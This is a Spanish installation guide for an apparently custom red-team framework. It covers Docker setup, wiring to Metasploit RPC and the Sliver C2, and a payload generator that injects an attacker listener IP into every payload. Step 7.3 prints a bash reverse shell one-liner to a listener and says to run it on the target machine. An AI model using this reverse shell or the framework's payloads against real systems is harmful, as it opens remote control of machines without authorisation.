# Red Team Framework v5.0 — Guía de Instalación Completa

---

## PASO 0: Requisitos previos en tu Kali Linux

Abre una terminal y ejecuta cada comando. Si alguno falla, sigue las instrucciones de error antes de continuar.

### 0.1 Actualizar sistema

```bash
sudo apt update && sudo apt upgrade -y
```

### 0.2 Instalar Docker

```bash
# Instalar Docker Engine
sudo apt install -y docker.io

# Verificar que se instaló
docker --version
# Debe mostrar algo como: Docker version 24.x.x
```

Si `docker --version` no muestra nada, ejecuta:
```bash
curl -fsSL https://get.docker.com | sudo sh
```

### 0.3 Instalar Docker Compose

```bash
# En Kali moderno ya viene incluido como plugin de Docker.
# Verifica con:
docker compose version
# Debe mostrar: Docker Compose version v2.x.x
```

Si no funciona `docker compose` (con espacio), prueba:
```bash
sudo apt install -y docker-compose-plugin
```

Si tampoco funciona, instala la versión standalone:
```bash
sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
# En este caso usa "docker-compose" (con guión) en vez de "docker compose" (con espacio)
```

### 0.4 Configurar Docker para tu usuario (no necesitar sudo)

```bash
sudo usermod -aG docker $USER
```

**IMPORTANTE:** Cierra la terminal y abre una nueva para que aplique el cambio.

Verifica que funciona sin sudo:
```bash
docker ps
# Debe mostrar una tabla vacía, NO un error de permisos
```

Si sigue pidiendo sudo, reinicia tu Kali:
```bash
sudo reboot
```

### 0.5 Verificar que todo está listo

```bash
docker --version          # Docker version 24.x.x o superior
docker compose version    # Docker Compose version v2.x.x o superior
docker ps                 # Tabla vacía (sin error)
```

Si los 3 comandos funcionan, continúa al Paso 1.

---

## PASO 1: Descargar el proyecto

### 1.1 Clonar el repositorio

```bash
cd ~
git clone https://github.com/TU_USUARIO/TU_REPOSITORIO.git
cd TU_REPOSITORIO
```

Reemplaza `TU_USUARIO/TU_REPOSITORIO` con tu URL real de GitHub.

### 1.2 Verificar que los archivos existen

```bash
ls -la docker-compose.yml .env.docker backend/Dockerfile frontend/Dockerfile
```

Debes ver los 4 archivos. Si alguno no aparece, el clone no fue completo.

---

## PASO 2: Configurar el archivo .env

### 2.1 Crear el archivo de configuración

```bash
cp .env.docker .env
```

### 2.2 Editar con nano

```bash
nano .env
```

Vas a ver esto:

```env
# ─── AI ───────────────────────────────────────────────────
KIMI_API_KEY=tu_api_key_de_moonshot_aqui

# ─── Listener / VPS (se inyecta en TODOS los payloads) ───
LISTENER_IP=
LISTENER_PORT=4444

# ─── Metasploit RPC (corre en tu Kali host) ──────────────
MSF_RPC_TOKEN=
MSF_RPC_HOST=host.docker.internal
MSF_RPC_PORT=55553

# ─── Sliver C2 (config montada via volumen) ──────────────
SLIVER_CONFIG_PATH=/configs/default.cfg

# ─── Puertos expuestos ───────────────────────────────────
FRONTEND_PORT=3000
BACKEND_PORT=8001

# ─── MongoDB (auto-configurado, no cambiar) ──────────────
MONGO_URL=mongodb://mongo:27017
DB_NAME=redteam_framework

# ─── CORS ─────────────────────────────────────────────────
CORS_ORIGINS=*
```

### 2.3 Qué cambiar (línea por línea)

**KIMI_API_KEY** — Tu API key de Moonshot/Kimi.
- Si la tienes: pega tu key. Ejemplo: `KIMI_API_KEY=sk-4zTj5qtLi...`
- Si no la tienes: déjala vacía. El escaneo funciona pero sin análisis AI.
- Dónde obtenerla: https://platform.moonshot.ai/

**LISTENER_IP** — La IP de tu VPS o máquina atacante.
- Es la IP donde vas a recibir las reverse shells.
- Ejemplo con Tailscale: `LISTENER_IP=100.88.122.107`
- Ejemplo con IP pública: `LISTENER_IP=203.0.113.50`
- Si no tienes VPS: pon la IP de tu Kali en la red local. Para verla: `ip addr show | grep 'inet ' | grep -v 127.0.0.1`
- **Esta IP se inyecta automáticamente en TODOS los payloads.**

**LISTENER_PORT** — Puerto donde escuchas. Default: `4444`. Cámbialo si quieres.

**MSF_RPC_TOKEN** — El password que usas para iniciar msfrpcd.
- Ejemplo: `MSF_RPC_TOKEN=MiTokenSecreto123`
- Si no vas a usar Metasploit: déjalo vacío.

**MSF_RPC_HOST** — NO CAMBIAR. `host.docker.internal` conecta automáticamente del contenedor Docker a tu Kali.
- Solo cámbialo si msfrpcd corre en otra máquina (ej: tu VPS).

**MSF_RPC_PORT** — Puerto de msfrpcd. Default: `55553`. No cambiar a menos que uses otro.

**Las demás líneas** — NO CAMBIAR. Están configuradas para Docker.

### 2.4 Guardar el archivo

- En nano: presiona `Ctrl+O`, luego `Enter`, luego `Ctrl+X`

### 2.5 Verificar que quedó bien

```bash
cat .env
```

Revisa que tus valores estén correctos. No debe haber espacios alrededor del `=`.

Correcto: `KIMI_API_KEY=sk-4zTj5qtLi...`
Incorrecto: `KIMI_API_KEY = sk-4zTj5qtLi...`

---

## PASO 3: Levantar la aplicación

### 3.1 Construir e iniciar los 3 contenedores

```bash
docker compose up -d --build
```

**Qué hace este comando:**
- Descarga la imagen de MongoDB 7
- Construye el backend (instala Python, nmap, nikto, dependencias)
- Construye el frontend (compila React, prepara Nginx)
- Inicia los 3 servicios en background

**La primera vez tarda 3-5 minutos.** Las siguientes veces tarda segundos.

### 3.2 Ver el progreso mientras se construye

```bash
docker compose up --build
```

(Sin el `-d` para ver los logs en vivo. Ctrl+C para salir cuando termine.)

### 3.3 Verificar que los 3 servicios corren

```bash
docker compose ps
```

Debes ver algo así:

```
NAME               STATUS          PORTS
redteam-backend    Up (healthy)    0.0.0.0:8001->8001/tcp
redteam-frontend   Up (healthy)    0.0.0.0:3000->80/tcp
redteam-mongo      Up (healthy)    27017/tcp
```

**Los 3 deben decir "Up".** Si alguno dice "Exit" o "Restarting", ve a la sección de Troubleshooting al final.

### 3.4 Verificar que el backend responde

```bash
curl http://localhost:8001/api/
```

Debe responder:
```json
{"message":"Red Team Automation Framework","version":"5.0.0","features":["tactical_engine","adaptive_planning","waf_bypass","global_config","docker"]}
```

### 3.5 Verificar la salud completa del sistema

```bash
curl -s http://localhost:8001/api/health | python3 -m json.tool
```

Debe mostrar:
```json
{
    "status": "healthy",
    "checks": {
        "mongodb": {"status": "connected", ...},
        "msf_rpc": {"host": "host.docker.internal", "token_set": true, "connected": false},
        "sliver": {"config_path": "/configs/default.cfg", "connected": false},
        "listener": {"ip": "100.88.122.107", "port": 4444, "configured": true}
    }
}
```

- `mongodb: connected` = Base de datos funcionando
- `msf_rpc: connected: false` = Normal si no has iniciado msfrpcd todavía
- `listener: configured: true` = Tu IP de VPS está cargada

---

## PASO 4: Abrir la aplicación

### 4.1 En el navegador de tu Kali

```
http://localhost:3000
```

### 4.2 Si accedes desde otra máquina en tu red

Usa la IP de tu Kali:
```
http://IP_DE_TU_KALI:3000
```

Para ver tu IP:
```bash
ip addr show | grep 'inet ' | grep -v 127.0.0.1
```

### 4.3 Verificar que la UI funciona

1. Debes ver el dashboard oscuro con el tema Cyberpunk/Matrix
2. En el sidebar izquierdo debes ver: Dashboard, Targets, Attack Graph, Chains, C2, Payloads, AI, Config, Logs
3. En la parte inferior del sidebar debe aparecer `LHOST: TU_IP` en verde (si la configuraste en .env)

---

## PASO 5: Conectar Metasploit RPC (en tu Kali host)

msfrpcd corre en tu Kali directamente, NO dentro de Docker.

### 5.1 Iniciar msfrpcd

```bash
msfrpcd -P MiTokenSecreto123 -S -a 0.0.0.0 -p 55553
```

Reemplaza `MiTokenSecreto123` con el mismo valor que pusiste en `MSF_RPC_TOKEN` en el .env.

**Explicación del comando:**
- `-P MiTokenSecreto123` = password de autenticación
- `-S` = usar SSL
- `-a 0.0.0.0` = escuchar en todas las interfaces (necesario para que Docker se conecte)
- `-p 55553` = puerto

### 5.2 Verificar que msfrpcd está corriendo

```bash
ss -tlnp | grep 55553
```

Debe mostrar una línea con `LISTEN` y `:55553`. Si no aparece, msfrpcd no arrancó.

### 5.3 Verificar que el backend lo detecta

```bash
curl -s http://localhost:8001/api/health | python3 -c "
import sys, json
d = json.load(sys.stdin)
msf = d['checks']['msf_rpc']
print(f'MSF RPC connected: {msf[\"connected\"]}')
print(f'Host: {msf[\"host\"]}:{msf.get(\"port\",55553)}')
print(f'Token set: {msf[\"token_set\"]}')
"
```

Si dice `connected: True`, Metasploit está conectado.

### 5.4 Si dice connected: False

```bash
# Verificar que el puerto es alcanzable desde dentro del contenedor
docker compose exec backend python3 -c "
import socket
s = socket.socket()
s.settimeout(3)
result = s.connect_ex(('host.docker.internal', 55553))
s.close()
print(f'Port 55553: {\"OPEN\" if result == 0 else \"CLOSED (error \" + str(result) + \")\"}')
"
```

Si dice `CLOSED`:
- `host.docker.internal` no funciona en tu versión de Docker.
- Solución: Busca la IP de tu Kali y ponla directamente en el .env:

```bash
# Ver tu IP
ip addr show docker0 | grep 'inet '
# Ejemplo de salida: inet 172.17.0.1/16

# Editar .env
nano .env
# Cambiar: MSF_RPC_HOST=172.17.0.1
# Guardar: Ctrl+O, Enter, Ctrl+X

# Reiniciar backend
docker compose restart backend
```

---

## PASO 6: Conectar Sliver C2 (opcional, en tu Kali host)

### 6.1 Instalar Sliver (si no lo tienes)

```bash
curl https://sliver.sh/install | sudo bash
```

### 6.2 Iniciar Sliver server

```bash
sliver-server
```

Esto abre la consola de Sliver.

### 6.3 Generar config de operador

Dentro de la consola Sliver:
```
new-operator --name redteam --lhost 127.0.0.1 --save /home/TU_USER/.sliver-client/configs/default.cfg
```

Reemplaza `TU_USER` con tu nombre de usuario de Kali. Para verlo: `whoami`

### 6.4 Montar el config en Docker

Edita `docker-compose.yml`:

```bash
nano docker-compose.yml
```

Busca la sección `backend:` y cambia la línea de volúmenes:

**Antes:**
```yaml
    volumes:
      - sliver_configs:/configs:ro
```

**Después** (reemplaza TU_USER con tu usuario real):
```yaml
    volumes:
      - /home/TU_USER/.sliver-client/configs:/configs:ro
```

Guardar y reiniciar:
```bash
docker compose restart backend
```

### 6.5 Verificar conexión

```bash
curl -s http://localhost:8001/api/health | python3 -c "
import sys, json
d = json.load(sys.stdin)
sliver = d['checks']['sliver']
print(f'Sliver connected: {sliver[\"connected\"]}')
print(f'Config path: {sliver[\"config_path\"]}')
"
```

---

## PASO 7: Usar la aplicación

### 7.1 Escanear un target

1. En la barra superior de la app, escribe la IP o dominio del objetivo
2. Click en **ENGAGE**
3. Observa el progreso en el Dashboard
4. Al completar: ve a **AI** para ver el análisis, **Attack Graph** para el árbol de ataque

### 7.2 Generar payloads

1. Click en **Payloads** en el sidebar
2. Verás 11 tipos de payload (Windows Meterpreter, Linux Shell, PowerShell, etc.)
3. Click en **GENERATE** en el payload que quieras
4. El sistema muestra:
   - **Generator Command**: comando exacto para generar el binario en tu Kali
   - **Handler Command**: comando para iniciar el listener que recibe la conexión
   - **Payload Content**: (para oneliners) el texto exacto para copiar/pegar en el target
5. Tu IP de VPS ya está inyectada automáticamente

### 7.3 Ejemplo: Reverse Shell con Bash

1. En tu VPS, inicia el listener:
   ```bash
   nc -lvnp 4444
   ```

2. En la app, ve a **Payloads** > **Bash One-Liner** > **GENERATE**

3. Copia el payload que te da (algo como):
   ```bash
   bash -i >& /dev/tcp/100.88.122.107/4444 0>&1
   ```

4. Ejecuta ese comando en la máquina objetivo

5. Debes recibir la shell en tu listener de nc

---

## Comandos del día a día

```bash
# Iniciar todo (después de reiniciar tu Kali)
cd ~/TU_REPOSITORIO
docker compose up -d

# Parar todo
docker compose down

# Ver logs si algo falla
docker compose logs -f backend

# Reiniciar después de cambiar .env
docker compose restart backend

# Reconstruir después de actualizar código (git pull)
docker compose up -d --build

# Ver estado de los contenedores
docker compose ps

# Entrar al contenedor del backend para debug
docker compose exec backend bash

# Borrar TODO y empezar de cero (incluyendo base de datos)
docker compose down -v
docker compose up -d --build
```

---

## Troubleshooting

### "docker compose" no funciona
```bash
# Prueba con guión
docker-compose up -d --build

# Si tampoco funciona, instala el plugin
sudo apt install -y docker-compose-plugin
```

### Un contenedor dice "Restarting" o "Exit"
```bash
# Ver qué error tiene
docker compose logs NOMBRE_DEL_SERVICIO
# Ejemplo:
docker compose logs backend
docker compose logs mongo
docker compose logs frontend
```

### "permission denied" al ejecutar docker
```bash
sudo usermod -aG docker $USER
# Cierra la terminal, abre una nueva
```

### Backend no conecta a MongoDB
```bash
# Verificar que mongo corre
docker compose ps mongo
# Debe decir "Up (healthy)"

# Si dice "Exit", reinicia
docker compose restart mongo
# Espera 10 segundos
docker compose restart backend
```

### Frontend muestra página en blanco
```bash
# Verificar que los archivos se compilaron
docker compose exec frontend ls /usr/share/nginx/html/
# Debe mostrar: index.html, static/, etc.

# Si está vacío, reconstruir
docker compose up -d --build frontend
```

### "host.docker.internal" no funciona
Esto pasa en algunas versiones de Docker en Linux.

```bash
# Opción 1: Encontrar la IP del bridge de Docker
ip addr show docker0 | grep 'inet '
# Usa esa IP (ej: 172.17.0.1) como MSF_RPC_HOST en .env

# Opción 2: Usar network_mode: host en el backend
# Edita docker-compose.yml, en la sección backend agrega:
#   network_mode: host
# Y quita las líneas de "ports:" y "networks:" del backend
```

### Quiero empezar de cero (borrar todo)
```bash
docker compose down -v          # Para todo y borra volúmenes
docker system prune -af         # Limpia imágenes y cache
docker compose up -d --build    # Reconstruye todo desde cero
```
